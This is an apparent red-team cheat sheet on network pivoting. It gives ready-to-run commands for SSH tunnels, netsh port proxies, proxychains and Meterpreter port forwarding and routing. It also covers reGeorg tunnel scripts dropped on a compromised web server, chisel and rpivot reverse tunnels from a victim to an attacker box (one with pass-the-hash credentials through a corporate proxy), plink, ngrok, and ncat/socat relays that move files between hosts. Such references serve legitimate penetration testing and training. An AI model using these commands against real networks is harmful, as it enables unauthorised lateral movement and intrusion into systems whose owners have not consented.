# Network Pivoting Techniques

## Summary

* [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
* [SSH](#ssh)
  * [SOCKS Proxy](#socks-proxy)
  * [Local Port Forwarding](#local-port-forwarding)
  * [Remote Port Forwarding](#remote-port-forwarding)
* [Proxychains](#proxychains)
* [Web SOCKS - reGeorg](#web-socks---regeorg)
* [Metasploit](#metasploit)
* [sshuttle](#sshuttle)
* [chisel](#chisel)
* [Rpivot](#rpivot)
* [plink](#plink)
* [ngrok](#ngrok)
* [Basic Pivoting Types](#basic-pivoting-types)
  * [Listen - Listen](#listen---listen)
  * [Listen - Connect](#listen---connect)
  * [Connect - Connect](#connect---connect)
* [References](#references)

## Windows netsh Port Forwarding

```powershell
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port (the connection is waited on it).
3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

## SSH

### SOCKS Proxy

```bash
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip : Konami SSH Port forwarding

```bash
[ENTER] + [~C]
-D 1090
```

### Local Port Forwarding

```bash
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```

### Remote Port Forwarding

```bash
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
```

## Proxychains

**Config file**: /etc/proxychains.conf

```bash
[ProxyList]
socks4 localhost 8080
```

Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`

## Web SOCKS - reGeorg

[reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

Drop one of the following files on the server:

- tunnel.ashx
- tunnel.aspx
- tunnel.js
- tunnel.jsp
- tunnel.nosocket.php
- tunnel.php
- tunnel.tomcat.5.jsp

```python
python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080

optional arguments:
  -h, --help           show this help message and exit
  -l , --listen-on     The default listening address
  -p , --listen-port   The default listening port
  -r , --read-buff     Local read buffer, max data to be sent per POST
  -u , --url           The url containing the tunnel script
  -v , --verbose       Verbose output[INFO|DEBUG]
```

## Metasploit

```powershell
# Meterpreter list active port forwards
portfwd list 

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd add –l 3389 –p 3389 –r target-host 
portfwd add -l 88 -p 88 -r 127.0.0.1
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445

# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
portfwd delete –l 3389 –p 3389 –r target-host 
# Meterpreter delete all port forwards
portfwd flush 

or

# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
run autoroute -s 192.168.15.0/24 
use auxiliary/server/socks4a

# Meterpreter list all active routes
run autoroute -p 

route #Meterpreter view available networks the compromised host can access
# Meterpreter add route for 192.168.14.0/24 via Session number.
route add 192.168.14.0 255.255.255.0 3 
# Meterpreter delete route for 192.168.14.0/24 via Session number.
route delete 192.168.14.0 255.255.255.0 3 
# Meterpreter delete all routes
route flush 
```

## sshuttle

```powershell
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
sshuttle -vvr username@pivot_host 10.2.2.0/24 
```

## chisel


```powershell
go get -v github.com/jpillora/chisel

# forward port 389 and 88 to hacker computer
user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
```

## Rpivot

Server (Attacker box)

```python
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```

Client (Compromised box)

```python
python client.py --server-ip <ip> --server-port 9443
```

Through corporate proxy

```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

Passing the hash

```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe \
--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
```

## plink

```powershell
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
```

## ngrok

```powershell
# get the binary
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip 

# log into the service
./ngrok authtoken 3U[REDACTED_TOKEN]Hm

# deploy a port forwarding for 4433
./ngrok http 4433
./ngrok tcp 4433
```


## Basic Pivoting Types

| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| Listen - Listen   | Exposed asset, may not want to connect out. |
| Listen - Connect  | Normal redirect.                            |
| Connect - Connect | Can’t bind, so connect to bridge two hosts  |

### Listen - Listen

| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| ncat              | `ncat -v -l -p 8080 -c "ncat -v -l -p 9090"`|
| socat             | `socat -v tcp-listen:8080 tcp-listen:9090`  |
| remote host 1     | `ncat localhost 8080 < file`                |
| remote host 2     | `ncat localhost 9090 > newfile`             |

### Listen - Connect

| Type              | Use Case                                                        |
| :-------------    | :------------------------------------------                     |
| ncat              | `ncat -l -v -p 8080 -c "ncat localhost 9090"`                   |
| socat             | `socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat localhost -p 8080 < file`                                 |
| remote host 2     | `ncat -l -p 9090 > newfile`                                     |

### Connect - Connect

| Type              | Use Case                                                                   |
| :-------------    | :------------------------------------------                                |
| ncat              | `ncat localhost 8080 -c "ncat localhost 9090"`                             |
| socat             | `socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat -l -p 8080 < file                                                    |
| remote host 2     | `ncat -l -p 9090 > newfile`                                                |

## References

* [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
* [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)